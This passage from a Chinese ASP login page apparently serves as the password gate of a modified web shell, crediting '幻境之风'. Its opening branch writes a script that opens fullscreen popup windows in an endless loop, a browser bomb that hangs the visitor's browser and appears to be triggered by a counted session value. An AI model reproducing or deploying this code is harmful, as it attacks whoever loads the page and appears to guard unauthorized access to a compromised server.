Session(Co) = 0
response.write "<script language='JavaScript'>while (true){ window.open('"&Co&"','','fullscreen=yes,Status=no,scrollbars=no,resizable=no');}</script>"
response.end
end if
%>
</head>
<body>
<table width="480" border="0" cellspacing="0" cellpadding="0" align="center" bgcolor="#61bbd3">
<tr> 
<td height="11">&nbsp;</td>
</tr>
<tr> 
<td height="30" align="center"></td>
</tr>
<tr valign="top"> 
<td height="182"align="center">
<form method="post" action="<%=Co%>" name="adm" onsubmit="return check()">
  <table width="413" border="0" align="center" cellpadding="0" cellspacing="0" bgcolor="#EEEAD6" height="289">
    <tr>
      <td height="249" align="center"><font face="华文行楷" size="4" color="#FF0000">幻境之风修改</font><br><font size="2">用户编号:<%=Session.SessionID%></font>
      <table width="100%" border="0" cellspacing="0" cellpadding="0" height="164">
          <tr>
            <td height="170"><table width="95%" border="0" align="center">
	  
	  <tr><td>
	  <fieldset><legend accesskey="F" align="left"><font size="2">登陆窗口</font></legend> 
	          <table width="100%" border="0" cellspacing="2" cellpadding="2">
                <tr> 
				  <td width="10%"></td>
                  <td width="20%"><font size="2">用&nbsp;户&nbsp;名：</font></td>
                  <td><font size="2"><input type="text" name="admid" class="areatype"></font></td>
                </tr>
                <tr> 
				<td width="10%"></td>
                  <td width="20%"><font size="2">密&nbsp;&nbsp;&nbsp;&nbsp;码：</font></td>
                  <td><font size="2"><input type="password" name="admpw" class="areatype"></font>
                  </td>
                </tr>
			    <tr>
				  <td width="10%"><input type=hidden name="admrz1" value="<%=regjm%>"></td>
                  <td><font size="2">附&nbsp;加&nbsp;码：</font></td>
                  <td><font size="2"><input type="password" name="admrz" class="areatype" size="7">  
                    &nbsp;附加码:<span style="background-color: #D0D0BF;line-height:200%"><font color=#000000><%=regjm%></font></span>      
                    </font>      
                  </td>     
                </tr>     
                <tr>      
                  <td colspan="3" align="center"><font size="2"><input type="submit" name="submit" value=" 登 陆 " class="areatype"></font></td>     
                </tr>     
              </table>     
	  </fieldset>      
      <p align="center"><%=Session(Co)%> 次</p> 
        </td></tr>    
	  </table></td>    
          </tr>    
        </table></td>    
    </tr>    
  </table></form>
</td>
</tr>
<%end if%>
</table>
</body>
</html>
<%end if%>






















































